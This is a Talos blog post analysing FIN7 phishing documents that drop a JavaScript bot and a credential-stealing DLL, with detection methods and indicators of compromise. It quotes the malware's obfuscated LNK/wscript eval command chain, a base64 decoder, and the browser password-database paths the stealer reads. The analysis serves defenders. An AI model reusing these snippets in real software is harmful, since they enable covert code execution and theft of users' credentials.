{
    "title": "talos blog __ cisco talos intelligence group - comprehensive threat intelligence_ fin7 group uses javascript and stealer dll variant in new attacks",
    "text": "Software\nReputation Center\nVulnerability Information\nMicrosoft Advisory Snort Rules  IP Blacklist Download\nAMP Naming Conventions\nTalos File Reputation\nAWBO Exercises  Library\nSupport Communities\nAbout\nCareers  Blog\nThreat Source Newsletter\nBeers with Talos PodcastCONNECT WITH US\n  \nÂ© 2020  Cisco Systems, Inc. and/or its affiliates. All rights reserved. View our Privacy Policy  here. Subscribe via Email\nNEWER POST OLDER POST HOME\nSUBSCRIBE TO: POST COMMENTS (ATOM)WEDNESDAY, SEPTEMBER 27, 2017\nSHARE THIS POSTThis post was authored by Michael Gorelik  and Josh Reynolds\nThroughout this blog post we will be detailing a newly discovered RTF document family that is being leveraged\nby the FIN7 group (also known as the Carbanak gang) which is a financially-motivated group targeting the\nfinancial, hospitality, and medical industries. This document is used in phishing campaigns to execute a series\nof scripting languages containing multiple obfuscation mechanisms and advanced techniques to bypass\ntraditional security mechanisms. The document contains messages enticing the user to click on an embedded\nobject that executes scripts which are used to infect the system with an information stealing malware variant.\nThis malware is then used to steal passwords from popular browsers and mail clients which are sent to remote\nnodes that are accessible to the attackers. These advanced mechanisms and the information stealing\nmalware will be discussed in detail. We will also review a number of static and dynamic detection mechanisms\nused in the AMP for Endpoints and Threat Grid product lines to detect these document families.\nOn June 9th, 2017 Morphisec Lab  published a blog post  detailing a new infection vector technique using an RTF\ndocument containing an embedded JavaScript OLE object. When clicked it launches an infection chain made up\nof JavaScript, and a final shellcode payload that makes use of DNS to load additional shellcode from a remote\ncommand and control server. In this collaboration post with Morphisec Lab and Cisco's Research and Efficacy\nTeam, we are now publishing details of this new document variant that makes use of an LNK embedded OLE\nobject, which extracts a JavaScript bot from a document object, and injects a stealer DLL in memory using\nPowerShell. The details we are releasing are to provide insight into attack methodologies being employed by\nsophisticated groups such as FIN7 who are consistently changing techniques between attacks to avoid\ndetection, and to demonstrate the detection capabilities of the AMP for Endpoints and Threat Grid product\nlines. This is relevant to the constantly changing threats that are affecting multiple types of industries on a daily\nbasis.\nThe dropper variant that we encountered makes use of an LNK file to execute wscript.exe with the beginning of\nthe JavaScript chain from a word document object:\nC:\\Windows\\System32\\cmd.exe..\\..\\..\\Windows\\System32\\cmd.exe /C set x=wsc@ript  \n/e:js@cript %HOMEPATH%\\md5.txt & echo  \ntry{w=GetObject(\"\",\"Wor\"+\"d.Application\");this[String.fromCharCode(101)+'va'+'l']\n(w.ActiveDocument.Shapes(1).TextFrame.TextRange.Text);}catch(e){};  \n>%HOMEPATH%\\md5.txt & echo %x:@=%|cmd\nThis chain involves a substantial amount of base64 encoded JavaScript files that make up each component of\nthe JavaScript bot. It also contains the reflective DLL injection PowerShell code to inject an information stealing\nmalware variant DLL which will be discussed further.\nA single one of these documents can produce as many as 40 JavaScript files. In order to identify similar\ntechniques, we decided to use entropy of a given JavaScript file, and the base64 decoding depth to cluster files\nwithin a scatter plot with the  ggplot  and  ggiraph  R libraries.\nBefore we demonstrate our analysis results, we will explain the values used for plotting and clustering of the\nJavaScript files.\nThe majority of the JavaScript obfuscation is nested base64 encodings. Base64 is a binary to text encoding\nscheme which can be used to represent any type of data. In the case of these documents it is used to encode\nJavaScript functionality multiple times, likely in order to avoid common analysis techniques employed by\ntraditional anti-virus software which only emulate JavaScript instructions for a limited amount of iterations. The\nbase64 blobs are hardcoded, or comma separated, which are then concatenated and decoded making up the\nnext JavaScript code to be executed. It is decoded using an CDO.Message ActiveXObject invocation and\nspecifying the ContentTransferEncoding to be base64 (note that the windows-1251 charset is Cyrillic, which\nmay indicate Russian origin):\nfunction b64dec(data){\n    var cdo = new ActiveXObject(\"CDO.Message\");\n    var bp = cdo.BodyPart;\n    bp.ContentTransferEncoding = \"base64\";\n    bp.Charset = \"windows-1251\";\n    var st = bp.GetEncodedContentStream();\n    st.WriteText(data);\n    st.Flush();\n    st = bp.GetDecodedContentStream();\n    st.Charset = \"utf-8\";\n    return st.ReadText;\n}\nThis is then evaluated using an obfuscated function invocation, E.G:\nMyName.getGlct()[String.fromCharCode(101)+'va'+'l'](b64dec(energy));\nThese base64 decoding steps lead to various execution branches of JavaScript bot functionality, and the\ninjection of a stealer DLL into memory:\nFigure 1: Detailed Document Infection Chain Using JavaScript and DLL Injection\nEntropy involves the calculation of disorder and uncertainty within a given amount of data. In this case, we are\ninterested in associating extracted JavaScript files based on this calculation, since variations of these\ndocuments contain similar functionality, but employed obfuscation mechanisms makes clustering them\ndifficult. We used the following calculation from  Ero Carrera's blog  in Python:\nimport math \ndef H(data): \n    if not data: \n        return 0 \n    entropy = 0 \n    for x in range(256): \n        p_x = float(data.count(chr(x)))/len(data) \n        if p_x > 0: \n           entropy += - p_x*math.log(p_x, 2) \n    return entropy\nThis calculation is done for each JavaScript file and is the X axis of our scatter plots that will be described in\nthe next section.\nWe began with an initial set of documents which did not contain a dropper DLL. We then calculated the amount\nof base64 decoding required to produce each file (Y axis) and calculated their respective entropy (X axis). We\nthen reviewed each scatter plot grouping and labeled their respective functionality in red:\nFigure 2: Scatter plot using entropy and base64 decoding depth\nThere are a number of conclusions from the scatter plot:\n1. The higher depth of base64 decoding shows more interesting functionality (to be expected)\n2. The bot functionality and C2 contact JavaScript is within multiple sets of files at close decoding depths\nand entropy\n3. The task scheduling functionality vary in depth and entropy (two separate cases)\nWe then applied the same technique to the second generation of documents which ship an entire base64\nencoded and compressed DLL:\nFigure 3: Scatter plot of PowerShell DLL documents\nThe outliers are the decoded DLLs and XML task files. When these components are removed from the scatter\nplot (leaving only JavaScript) we see similar clusters to the first generation of documents:\nFigure 4: Modified Plot of PowerShell DLL Documents\nBased on the number of clusters and range of entropy we see that this generation of documents contain more\nfiles with varying functionality and depth. This plotting technique also provides a method of identifying new\nfunctionality by showing outliers, such as the labeled PS Outlier which contains an array of encoded PowerShell\nbytes rather than a blob that provides the final PowerShell for DLL injection:\nFigure 5: Identified New PowerShell Functionality Due to Entropy Outlier\nOnce similar functionality has been clustered, the changes made between generated documents become\napparent. Variable names and GUID paths are changed:\nFigure 6: Variables and Path GUID JS Changes\nThis functionality also highlights an interesting obfuscation mechanism that some emulation engines may\nignore. The function body of the evaluated JavaScript appears to be within a multi-line comment, however, in\nreality this is evaluated as a multi-line string. This can be seen below when tested in Chrome's scripting\nconsole:\nFigure 7: JavaScript Multi-Line Comment String Obfuscation\nFunctions are re-ordered:\nFigure 8: Reordered Function Example\nCommand and Control addresses are changed:\nFigure 9: Changed Command and Control Addresses\nVarying base64 encoding depths, which can be identified using our scatter plot, such as the PowerShell write\nand execution functionality:\nFigure 10: PowerShell Write and Execute Functionality at Different Base64 Decoding Depths\nWhich when compared vary in decoding depth but are the same functionality:\nFigure 11: Code Comparison PowerShell Write and Execute Functionality\nOne of the final components of these JavaScript 'decoding chains' is a PowerShell reflective DLL injection\nscript which contains copy pasted functions from  Powersploit's Invoke-ReflectivePEInjection . The DLL is de-\nobfuscated by decoding the base64 blob and uses IO.Compression.DeflateStream to decompress the resulting\nbytes. In order to recover the DLL we can simply write the decompressed bytes to disk using\n[io.file]::WriteAllBytes.\nFigure 12: PowerShell stream decompression and writing DLL to disk\nFigure 13: Copy-Pasted PowerSploit Invoke-ReflectivePEInjection Code\nWe wrote a blog post about the H1N1 dropper in August 2016, which  referenced a string de-obfuscation script\nto handle multiple 32-bit value XOR, ADD, and SUB string obfuscation techniques. This script is able to handle\nsimilar functionality in this stealer DLL:\nFigure 14: Firefox String Decoding\nImport hashing functionality involves resolving the export table for a given DLL (common for packers/malware):\nFigure 15: PowerShell Injected DLL Hashing Functionality PE Offsets\nThen using XOR and ROL algorithm over given export values to compare against given hashes for exports to\nresolve:\nFigure 16: PowerShell Injected DLL Hashing Algorithm\nThis DLL also contains similar stealer functionality, E.G the decryption of Intelliform data using\nCryptUnprotectData by hashing cached URLs:\nFigure 17: PowerShell Injected DLL Intelliform Data Stealing\nThis binary also contains Outlook and Firefox stealer functionality and the ability to steal login information from\nGoogle Chrome, Chromium, forks of Chromium and Opera browsers that will be discussed in the next section.\nThe Chrome, Chromium, Chromium forks and Opera credential stealing functionality opens the [Database\nPath]\\Login Data sqlite3 database, reads the URL, username, and password fields, and calls\nCryptUnprotectData to decrypt user passwords. The following paths are checked for this database under\n%APPDATA%, %PROGRAMDATA%, and %LOCALAPPDATA%:\n\\Google\\Chrome\\User Data\\Default\\Login Data\n\\Chromium\\User Data\\Default\\Login Data\n\\MapleStudio\\ChromePlus\\User Data\\Default\\Login Data\n\\YandexBrowse\\User Data\\Default\\Login Data\n\\Nichrom\\User Data\\Default\\Login Data\n\\Comodo\\Dragon\\User Data\\Default\\Login Data\nAlthough Opera is not a fork of Chromium, the newest version has credentials with the same implementation\nunder the path: \\Opera Software\\Opera Stable\\Login Data\nIn addition to the JavaScript bot functionality, the stolen data is dumped to %APPDATA%\\%USERNAME%.ini\nand sets the file creation time to be that of ntdll.dll. This data is read and encrypted using the SimpleEncrypt\nfunction, which as their name implies, is a simple substitution cipher:\nFigure 18: Command and Control Data Substitution Cipher\nThis is then POSTed to a hardcoded command and control addresses, including the Google Apps Script hosting\nservice (also notice the alfIn variable declaration which is the alphabet used for the substitution cipher):\nFigure 19: Command and Control Data Exfiltration JavaScript Functionality\nThis is again using the comment block evasion technique.\nThe AMP for Endpoints and Threat Grid product lines are ideal for dealing with this threat, as they can use both\nstatic and dynamic activity to detect malicious activity.\nWithout clicking on the embedded OLE object within the document Threat Grid can provide insight into possible\nmalicious activity using static attributes alone. Embedded functionality is automatically extracted by Threat\nGrid, in this instance the embedded LNK OLE object contains seemingly malicious commands that are\nexecuted when clicked:\nFigure 20: Document LNK Command Prompt Static Attributes\nFigure 21: Active Document LNK Static Attributes\nThe OLE object can be clicked on within the document during the Threat Grid run using the Open Embedded\nObject in Word Document playbook, which will automatically execute the embedded object during the Threat\nGrid run when selected from the submission dropdown menu:\nFigure 22: Selecting Playbook from Submission Menu\nA depiction of this automated user interaction can be seen below:\nFigure 23: Clicking on Document OLE Object Through Playbook\nWhen clicked additional behavioral indicators are triggered based on dynamic behavior:\nFigure 24: Dynamic Activity Caused by Clicking the OLE Object\nTask creations (used by the JavaScript bot for periodic execution of components) can also be observed:\nFigure 25: Task Creation Dynamic Activit y\nThe JavaScript content that is periodically executed can be seen the Artifacts section and can be downloaded\nor resubmitted for further analysis:\nFigure 26: Written JavaScript Artifact Objects\nThis intelligence is then integrated back into the AMP cloud protecting all customers who may be targeted by\nsimilar attack methodologies.\nAMP for Endpoints has the ability to observe dynamic activity through a number of methods. One of these is\nthe capture of command line arguments which are then sent to the AMP cloud for analysis. In this case, we're\nable to observe the execution of wscript.exe when the OLE object is clicked:\nFigure 27: Captured Command Line Arguments in AMP for Endpoints Device Trajectory \nThis triggers an Indicator of Compromise which can then be further investigated:\nFigure 28: Indicator of Compromise from Captured Command Line Arguments\nThe FIN7 group is an example of an advanced adversary targeting a variety of industries using conventional\ntechnologies that ship with most versions of Microsoft Windows. Through the use of Microsoft Word\ndocuments to ship entire malware platforms they have the ability to leverage scripting languages to access\nActiveX controls, and \"file-less\" techniques to inject shipped portable executables into memory using PowerShell\nwithout ever having the portable executable touch disk. Clustering JavaScript also demonstrates a number of\nways FIN7 makes minor changes between releases, and establishes outliers to observe major changes.\nThrough the observation of static and dynamic attributes we're able to establish indicators of compromise\nbased on the embedded OLE object which can be used to identify FIN7 documents, and identify documents\nwhich may be leveraging similar functionality to protect our customers.\nTalos has released the following Snort rule(s) to address this threat. Please note that additional rules may be\nreleased at a future date and current rules are subject to change pending additional information. Firepower\ncustomers should use the latest update to their ruleset by updating their SRU. Open Source Snort Subscriber\nRule Set customers can stay up to date by downloading the latest rule pack available  for purchase on\nSnort.org.\nSnort Rules: 44430-44433\nAdditional ways our customers can detect and block this threat are listed below.\nAdvanced Malware Protection ( AMP ) is ideally suited to\nprevent the execution of the malware used by these threat\nactors.\nCWS  or WSA  web scanning prevents access to malicious\nwebsites and detects malware used in these attacks.\nEmail Security  can block malicious emails sent by threat\nactors as part of their campaign.\nNetwork Security appliances such as NGFW , NGIPS , and\nMeraki MX  can detect malicious activity associated with\nthis threat.\nAMP Threat Grid  helps identify malicious binaries and build\nprotection into all Cisco Security products.\nUmbrella , our secure internet gateway (SIG), blocks users\nfrom connecting to malicious domains, IPs, and URLs, whether users are on or off the corporate network.\n6bc8770206c5f2bb4079f7583615adeb4076f2e2d0c655fbafedd9669dc3a213\ndf22408833b2ae58f0d3e2fe87581be31972ef56e0ebf5efafc4e6e0341b5521\n2b4991b2a2792436b50404dcf6310ef2af2573505810ebac08e32f17aee3fbbe\nebca565e21a42300e19f250f84b927fa3b32debf3fe13003a4aa5b71ed5cbee9\n6604d806eb68fdf914dfb6bbf907a4f2bd9b8757fc4da4e7c5e4de141b8d4e2c\n91f028b1ade885bae2e0c6c3be2f3c3dc692830b45d4cf1a070a0bd159f1f676\nad578311d43d3aea3a5b2908bc6e408b499cc832723225ff915d9a7bc36e0aa4\nfadb57aa7a82dbcb2e40c034f52096b63801efc040dd8559a4b8fc873bc962a1\n91f028b1ade885bae2e0c6c3be2f3c3dc692830b45d4cf1a070a0bd159f1f676\n74a5471c3aa6f9ce0c806e85929c2816ac39082f7fea8dbe8e4e98e986d4be78\nf73c7ed3765fec13ffd79aef97de519cfbd6a332e81b8a247fe7d1ccb1946c9c\n104[.]232[.]34[.]36\n5[.]149[.]253[.]126\n185[.]180[.]197[.]20\n195[.]54[.]162[.]79\n31[.]148[.]219[.]18\nhXXps://script[.]google[.]com/macros/s/AKfycbxvGGF-\nQBkaNIWCBFgjohBtkmyfyRpvm91yCGEvzgDvAJdqfW8_/exec\nhXXps://script[.]google[.]com/macros/s/AKfycbz6dmNJfCPwFchoq6WkJsMjQu22SJTJ9pxMUeQR7bCpmJhW\n6Bg2/exec\nhXXps://script[.]google[.]com/macros/s/AKfycbwkNc-\n8rk0caDWO5I4KMymvOXVinfOpR1eevZ63xiXDvcoqOE6p/exec\nhXXps://script[.]google[.]com/macros/s/AKfycbxyiIBW9SHUFV4S5JM6IW-\ndmVADFOrTJDM7bZspeBf2Kpf4IN0/exec\nPOSTED BY EDMUND BRUMAGHIN  AT 1:38 PM  \nLABELS: FIN7 , MALDOC , MALWARE , THREATS\n   FIN7 Group Uses JavaScript and Stealer DLL Variant in New\nAttacks\nEXECUTIVE SUMMARY\nINTRODUCTION\nINFECTION VECTOR\nJAVASCRIPT COMPARISONS\nClustering Decoded JavaScript Functionality\nBase64 Encodings\nJavaScript Entropy\nScatter Plot for Clustering & JavaScript Functionality\nJavaScript Obfuscation Changes\n \n STEALER DLL\nRecovering the DLL\nStealer DLL Functionality\nChrome, Chromium and Opera Credential Stealing\nStolen Data Command and Control\nAMP COVERAGE\nAMP Threat Grid\nAMP for Endpoints\nCONCLUSION\nCOVERAGE\nINDICATORS OF COMPROMISE\nJavaScript Bot Documents\nJavaScript Bot Documents with PowerShell DLL Injection\nCommand and Control IPs\nGoogle Apps Script Command and Control URLs\nEnter your comment...\nComment as:  \nGoogle Account\nPublishPublish \nPreviewPreviewNO COMMENTS:\nPOST A COMMENT\nSearch Blog\nSUBSCRIBE TO OUR FEED\n Posts\n Comments\nâº  2020 (63)\nâº  2019 (277)\nâº  2018 (198)\nâ¼  2017 (171)\nâº  DECEMBER (9)\nâº  NOVEMBER (11)\nâº  OCTOBER (15)\nâ¼  SEPTEMBER (17)\nThreat Round Up for Sept 22 - Sept 29\nBanking Trojan Attempts To Steal\nBrazillion$\nFIN7 Group Uses JavaScript and Stealer\nDLL Variant...\nCCleaner Command and Control Causes\nConcern\nBeers with Talos EP 13:A Vast CCleanup,\nStrutting ...\nCCleanup: A Vast Number of Machines at\nRisk\nThreat Round Up For Sept 8 - Sept 15\nBeers with Talos EP12 - IrmaGerd! The\nInternet Ate...\nDeep Dive in MarkLogic Exploitation\nProcess via Ar...\nVulnerability Spotlight: YAML Parsing\nRemote Code ...\nVulnerability Spotlight: LibOFX Tag\nParsing Code E...\nMicrosoft Patch Tuesday - September\n2017\nVulnerability Spotlight: TALOS-2017-\n0430/0431: Mul...\nAnother Apache Struts Vulnerability\nUnder Active E...\nVulnerability Spotlight: Content Security\nPolicy b...\nGraftor - But I Never Asked for Thisâ¦\nThreat Round Up for Aug 25 - Sep 1\nâº  AUGUST (16)\nâº  JULY (14)\nâº  JUNE (14)\nâº  MAY (19)\nâº  APRIL (17)\nâº  MARCH (17)\nâº  FEBRUARY (12)\nâº  JANUARY (10)\nâº  2016 (98)\nâº  2015 (62)\nâº  2014 (67)\nâº  2013 (30)\nâº  2012 (53)\nâº  2011 (23)\nâº  2010 (93)\nâº  2009 (146)\nâº  2008 (37)BLOG ARCHIVE\nRECOMMENDED BLOGS\nCISCO BLOG\nIndustry 4.0 in Action! Highlights from the\nCisco Manufacturing Summit\nSNORT BLOG\nSnort rule update for March 10, 2020 â\nMicrosoft Patch Tuesday\nCLAMAVÂ® BLOG\nClamAV Bugzilla Upgrade Software  Vulnerability  Information  Reputation  Center  Library  Support  Careers  Blog  Podcasts  About\n "
}